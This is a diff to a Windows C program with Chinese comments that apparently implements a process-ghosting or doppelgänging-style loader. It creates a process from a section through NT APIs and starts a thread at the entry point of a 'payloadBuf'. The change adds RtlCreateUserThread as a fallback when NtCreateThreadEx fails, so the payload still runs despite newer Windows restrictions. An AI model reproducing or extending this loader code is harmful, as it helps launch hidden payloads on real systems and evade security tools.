@@ -15,6 +15,7 @@ _NtCreateProcessEx NtCreateProcessEx = NULL;
 _NtCreateThreadEx NtCreateThreadEx = NULL;
 _NtReadVirtualMemory NtReadVirtualMemory = NULL;
 _RtlCreateProcessParametersEx RtlCreateProcessParametersEx = NULL;
+_RtlCreateUserThread RtlCreateUserThread = NULL;
 
 /**
  * 初始化 NT API 函数指针
@@ -31,11 +32,17 @@ BOOL InitializeNtFunctions() {
     NtCreateThreadEx = (_NtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");
     NtReadVirtualMemory = (_NtReadVirtualMemory)GetProcAddress(hNtdll, "NtReadVirtualMemory");
     RtlCreateProcessParametersEx = (_RtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
+    RtlCreateUserThread = (_RtlCreateUserThread)GetProcAddress(hNtdll, "RtlCreateUserThread");
 
     if (!NtCreateSection || !NtCreateProcessEx || !NtCreateThreadEx ||
         !NtReadVirtualMemory || !RtlCreateProcessParametersEx) {
         printf("错误：无法获取 NT API 函数地址\n");
         return FALSE;
+    }
+
+    // RtlCreateUserThread 是可选的
+    if (!RtlCreateUserThread) {
+        printf("警告：无法获取 RtlCreateUserThread，将仅使用 NtCreateThreadEx\n");
     }
 
     return TRUE;
@@ -407,7 +414,7 @@ int wmain(int argc, WCHAR* argv[]) {
     printf("    入口点 RVA：0x%X\n", entryRVA);
     printf("    入口点 VA：0x%p\n", (PVOID)entryPoint);
 
-    // 创建线程
+    // 创建线程 - 方法 1: NtCreateThreadEx
     HANDLE hThread = NULL;
     status = NtCreateThreadEx(
         &hThread,
@@ -424,11 +431,41 @@ int wmain(int argc, WCHAR* argv[]) {
     );
 
     if (status != STATUS_SUCCESS) {
-        printf("错误：NtCreateThreadEx 失败，状态码：0x%lX\n", status);
-        TerminateProcess(hProcess, 1);
-        CloseHandle(hSection);
-        free(payloadBuf);
-        return 1;
+        printf("警告：NtCreateThreadEx 失败，状态码：0x%lX\n", status);
+
+        // 方法 2: 尝试使用 RtlCreateUserThread（备选方案）
+        if (RtlCreateUserThread) {
+            printf("    尝试使用 RtlCreateUserThread...\n");
+            status = RtlCreateUserThread(
+                hProcess,
+                NULL,           // SecurityDescriptor
+                FALSE,          // CreateSuspended
+                0,              // StackZeroBits
+                0,              // StackReserve
+                0,              // StackCommit
+                (PVOID)entryPoint,
+                NULL,           // Parameter
+                &hThread,
+                NULL            // ClientId
+            );
+
+            if (status != STATUS_SUCCESS) {
+                printf("错误：RtlCreateUserThread 也失败，状态码：0x%lX\n", status);
+                printf("\n注意：这可能是 Windows 10 新版本的安全限制\n");
+                printf("进程已创建（PID: %d），但无法启动线程\n", processId);
+                CloseHandle(hSection);
+                free(payloadBuf);
+                // 不终止进程，让用户可以观察
+                return 1;
+            }
+        } else {
+            printf("错误：无备选线程创建方法\n");
+            printf("\n注意：这可能是 Windows 10 新版本的安全限制\n");
+            printf("进程已创建（PID: %d），但无法启动线程\n", processId);
+            CloseHandle(hSection);
+            free(payloadBuf);
+            return 1;
+        }
     }
 
     printf("    线程已创建！\n");
